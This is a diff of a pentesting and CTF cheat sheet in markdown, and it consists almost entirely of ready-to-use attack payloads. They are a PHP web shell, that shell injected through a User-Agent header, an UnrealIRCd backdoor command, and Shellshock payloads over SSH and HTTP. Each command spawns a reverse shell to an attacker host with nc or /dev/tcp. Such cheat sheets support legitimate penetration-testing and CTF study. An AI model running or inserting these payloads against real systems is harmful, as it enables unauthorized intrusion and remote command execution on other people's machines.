@@ -46,7 +46,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   
   ---
   
- `PHP Web Shell`
+  `PHP Web Shell`
 
   ```php
   <?php system($_GET['cmd']); ?>
@@ -68,15 +68,24 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```cmd
   User-Agent: <?php system($_GET['cmd']); ?>
   ```
+  
   ---
   
- `Shellshock (SSH)`
+  `UnrealIRCd`
  
- ```cmd
- root@kali:~# ssh user@192.168.1.3 -i id_rsa '() { :;}; nc 192.168.1.2 443 -e /bin/bash'
- ```
+  ```cmd
+  root@kali:~# echo "AB;nc -e /bin/sh 192.168.1.2 443" |nc 192.168.1.3 6667
+  ```
  
- `Shellshock (HTTP)`
+  ---
+ 
+  `Shellshock (SSH)`
+ 
+  ```cmd
+  root@kali:~# ssh user@192.168.1.3 -i id_rsa '() { :;}; nc 192.168.1.2 443 -e /bin/bash'
+  ```
+ 
+  `Shellshock (HTTP)`
 
   ```cmd
   curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
